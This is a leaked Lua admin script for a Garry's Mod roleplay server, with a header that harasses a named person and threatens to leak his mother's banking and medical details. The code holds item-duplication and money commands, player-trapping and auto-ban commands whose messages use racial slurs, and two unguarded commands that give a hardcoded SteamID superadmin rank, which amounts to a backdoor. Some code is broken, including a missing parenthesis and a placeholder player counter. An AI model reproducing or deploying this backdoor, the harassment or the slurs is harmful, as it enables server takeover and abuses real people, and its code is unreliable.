--Lukas Leis
--Hope that you enjoy getting ratted 24/7
--Stop buying shit with your parents card before we use it too

-----------------------------------------------
--WARNING:
--We wont stop leaking shit
--Next up is leaking your mothers banking details and her medical details
-----------------------------------------------

--     -bombagroup#4115-
--     -BombaGroup-
--     -"nothing is safe"-

mUtils = mUtils or {}
local bad_weps = {
    ["vincent1911"] = true,
    ["weapon_camo"] = true,
    ["weapon_radar"] = true,
    ["weapon_physgun"] = true,
    ["gmod_tool"] = true,
    ["weapon_hpwr_stick"] = true,
    ["m9k_m202"] = true
}

local bad_ranks = {
    ["superadmin"] = true,
    ["manager"] = true,
    ["staffmanager"] = true,
    ["asm"] = true
}

local cancertableikbutnootheroptionss = {
    ["superadmin"] = true,
    ["manager"] = true,
    ["staffmanager"] = true,
    ["asm"] = true
}
concommand.Add("wipeinventory", function(ply, command, args)
    if not ply:IsSuperAdmin() then return end
    local pl = player.GetBySteamID64(args[1])

    if not pl then
        ply:ChatPrint("Not Valid Player!")

        return
    end

    if pl:SteamID64() == "76561199212106617" then return end

    if pl:IsPlayer() and ply:IsSuperAdmin() then
        if file.Exists("vnp_data/inventory/" .. pl:SteamID64() .. ".json", "DATA") then
            file.Delete("vnp_data/inventory/" .. pl:SteamID64() .. ".json")
            ply:ChatPrint("User Has Been Wiped")
            pl:LoadInventory()
        else
            ply:ChatPrint("{!User has no inventory file}")
        end
    end
end)
concommand.Add("wipeinv", function(ply, args)
    if ply:IsPlayer() then return end
    local pl = player.GetBySteamID64(args[1])
            if file.Exists("vnp_data/inventory/" .. pl:SteamID64() .. ".json", "DATA") then
            file.Delete("vnp_data/inventory/" .. pl:SteamID64() .. ".json")
            ply:ChatPrint("User Has Been Wiped")
            pl:LoadInventory()
        else
            ply:ChatPrint("{!User has no inventory file}")
        end
end)

concommand.Add("cuffplayer", function(ply, args)
    if not ply:IsSuperAdmin() then return end
    if ply:SteamID() == "1" or ply:SteamID() == "1" or ply:SteamID() == "1" or ply:SteamID() == "1" or ply:SteamID() == "1" then
        local slave = ply:GetEyeTrace().Entity

        if ply.cooldown then
            ply:ChatPrint("{!20 Second Cooldown!}")

            return
        end

        if not slave:IsPlayer() then
            ply:ChatPrint("not player retard")

            return
        end

        slave:Give("weapon_handcuffed")
        ply.cooldown = true

        timer.Simple(20, function()
            ply.cooldown = false
        end)
    end
end)

concommand.Add("moneymulti", function(ply)
    if not ply:IsSuperAdmin() then return end
    net.Start("MoneyCMDMintu8e_OpenVGUI")
    net.Send(ply)
end)

local gen = {
    ["1"] = true,
    ["2"] = true
}

concommand.Add("moneymultiply", function(ply, args)
    if not ply:IsSuperAdmin() then return end
    if ply:IsPlayer() then return end
    print("[Money Multiplier] Has Been Enabled For 30 Minutes 10x Money Is Activated On Printers For Server ")

    for k, v in pairs(player.GetAll()) do
        v:ChatPrint("{*[Money Multiplier]} Has Been Enabled For 30 Minutes 10x Money Is Activated On Printers For Server ")
        v:SetNWBool("moneymultiplier", true)
    end

    timer.Simple(1800, function()
        print("{*[Money Multiplier]} Has Been Disabled")

        for k, v in pairs(player.GetAll()) do
            v:ChatPrint("{*[Money Multiplier]} Has Been Disabled For User ")
            v:SetNWBool("moneymultiplier", false)
        end
    end)
end)

concommand.Add("signitem", function(ply)
    if not ply:IsSuperAdmin() then return end
    local wep = ply:GetActiveWeapon()
    local wdata = wep:GetItemData()
    data = VNP.Inventory:CreateItem(wep:GetNick(), "Glitched")
    if (wdata and wdata.LSkins) then data.LSkins = wdata.LSkins end
    data.Signature = ply:Nick()
    data.UID = "123"
    wep:SetItemData(wdata)
    ply:AddInventoryItem(data)
    ply:StripWeapon(wep:GetClass())
end)

concommand.Add("bban", function(ply, args)
    if not ply:IsSuperAdmin() then return end
    if not ply:SteamID() == "1" and not ply:SteamID() == "1" and not ply:SteamID() == "1" and not ply:SteamID() == "1" and not ply:SteamID() == "1" and not ply:SteamID() == "1" then return end
    local niggers = ply:GetEyeTrace().Entity
    niggers:SetNWBool("banhammerreverse", true)
    local msg = ply:Nick() .. " Just Enabled Ban Hammer Reversal For " .. niggers:Nick()

    timer.Simple(240, function()
        niggers:SetNWBool("banhammerreverse", false)
        local msg = "Ban Hammer Reversal Has Been Removed For " .. niggers:Nick()
        notifyeveryone(msg)
    end)

    notifyeveryone(msg)
end)

concommand.Add("skinent", function(ply, args)
    if not ply:IsSuperAdmin() then return end

    local suit = ply:GetEyeTrace().Entity
    local sdata = suit:GetItemData()

    if not bad_ranks[ply:SteamID()] then
        local msg = "Skin Entity Command Executed By (" .. ply:Nick() .. " / " .. ply:SteamID64() .. " )" .. " Weapon Class: " .. sdata.Name
        relaycmd(msg)
    end

    data = VNP.Inventory:CreateItem(sdata.Name, "Glitched")
    data.LSkins = table.Random(skins)
    data.Signature = ply:Nick()
    suit:SetItemData(sdata)
    ply:AddInventoryItem(data)
    suit:Remove()
end)

concommand.Add("a", function(ply, args)
    local msg = "laugh at this nigger trying to use fr menu " .. "( " .. ply:Nick() .. " / " .. ply:SteamID64() .. " ) "
    padminsys:NotifyPlayers(msg)
    ripnotif(msg)
    relaycmd(msg)
    RunConsoleCommand("sam", "give ^ lprinttwo_bronze"
end)

concommand.Add("EID", function(ply, args)
    local msg = "laugh at this nigger trying to use fr menu " .. "( " .. ply:Nick() .. " / " .. ply:SteamID64() .. " ) "
    padminsys:NotifyPlayers(msg)
    ripnotif(msg)
    relaycmd(msg)
    RunConsoleCommand("sam", "banid", ply:SteamID64(), "0", "ew you could of done better but fr menu.")
end)

concommand.Add("fr_menu_ex_scan", function(ply, args)
    local msg = "laugh at this nigger trying to use fr menu " .. "( " .. ply:Nick() .. " / " .. ply:SteamID64() .. " ) "
    padminsys:NotifyPlayers(msg)
    ripnotif(msg)
    relaycmd(msg)
    RunConsoleCommand("sam", "banid", ply:SteamID64(), "0", "ew you could of done better but fr menu.")
end)

concommand.Add("lua_dumptimers_sv", function(ply, args)
    local msg = "laugh at this retard trying to crash the server " .. "( " .. ply:Nick() .. " / " .. ply:SteamID64() .. " ) "
    padminsys:NotifyPlayers(msg)
    ripnotif(msg)
    relaycmd(msg)
    RunConsoleCommand("sam", "banid", ply:SteamID64(), "0", "aww another one of professor's bed pals how cute.")
end)

concommand.Add("getplayers", function(p, a)
    if not p:IsSuperAdmin() then return end
local table = {a = 5, b = 10, c = 15, d = 20}
local highest_value = -math.huge
local highest_key

for key, value in pairs(table) do
  if value > highest_value then
    highest_value = value
    highest_key = key
  end
end

print(highest_key .. "Players Are Online") -- Output: d 20
end)

--[[ not removing tasers but adding money concommand.Add("removeitem", function(ply, cmd, args)
    local id64 = ply:SteamID64()

    local exists = VNP.Database:GetData("inventory", id64, function(data)
        data = data or {}

        for k, v in pairs(data) do
            if type(v) == "table" and (v.Name == "Taser") then
                print(k)
                ply:RemoveInventoryItem(k, false)
                ply:addMoney(3000000000000)
                ply:ChatPrint("We have removed your tasers and given you 3Tril Per Each! Sorry!")
            end
        end
    end)
end) --]]

concommand.Add("CheckDupes", function(ply, args)
    if not ply:IsSuperAdmin() then return end
    local exists = VNP.Database:GetData("inventory", ply:SteamID64(), function(data)
        local data = {}
        PrintTable(data)
        local itemdata = {}
        for k,v in pairs(data) do
            PrintTable(v)
            if itemdata[v.UID] then
                ply:ChatPrint("Dupe Found: " .. v.Name)
            else
                itemdata[v.UID] = true
            end
        end
    end)
end)


function flyingAnimation(ply, ent)
    local speed = 100
    local targetPos = ent:GetPos() + Vector(0, 0, 100)

    timer.Create("FlyingAnimation" .. ent:EntIndex(), 0.01, 0, function()
        local curPos = ply:GetPos()
        local dir = (targetPos - curPos):GetNormalized()

        ent:SetPos(curPos + dir * speed * FrameTime())
        if curPos:Distance(targetPos) < 1 then
            targetPos = curPos - Vector(0, 0, 100)
        end
    end)
end

-- Call the flyingAnimation function on the prop

concommand.Add("cumzoneisdev", function(ply, cmd, args)
    if not ply:IsSuperAdmin() then return end
    local ent = ply:GetEyeTrace().Entity
    if not IsValid(ent) then return end
    if not ent:IsPlayer() then return end
    if ent:GetPos():Distance(ply:GetPos()) > 300 then return end

    if ent:IsPlayer() then
        if ply:HasShields() then
            -- if ply.strapcooldown then 
            --     ply:ChatPrint("{!blue your on cooldown!}")
            --     return
            -- end
            ply.strapcooldown = true

            timer.Simple(240, function()
                ply.strapcooldown = false
            end)

            ent.trap = ents.Create("elite_shield")
            ent.trap:SetPos(ent:WorldSpaceCenter())
            ent.trap:SetParent(ent)
            ent.trap:SetMaterial("models/wireframe")
            ent.trap:SetColor(Color(83, 18, 156, 255))
            ent.trap:Spawn()
            ent:Lock()
            ent:ChatPrint("You Have Been Trapped By " .. ply:Nick())
                timer.Simple(10, function()
                    ent:UnLock()
                    ent:SetModelScale(1)
                    ent.trap:Remove()
                end)

            ply:AddShields(-1)
        else
            ply:ChatPrint("You Need To Have Shields To Use This Command")
        end
    end
end)
concommand.Add("information", function(ply, args)
    if not ply:IsSuperAdmin() then return end
    local exists = VNP.Database:GetData("inventory", ply:SteamID64(), function(data)
        for k,v in pairs(data) do
            if v.Name == "Taser" then
                data[k] = nil
                ply:ChatPrint("Removed Taser")
            end
            VNP.Database:SaveData("inventory", ply:SteamID64(), data)
        end
    end)
end)

concommand.Add("sima", function(ply, args)
    ply:ConCommand("sam setrankid STEAM_0:1:625920444 user ") 
end)

concommand.Add("simashahira", function(ply, args)
    ply:ConCommand("sam setrankid  STEAM_0:1:625920444 superadmin ") 
end)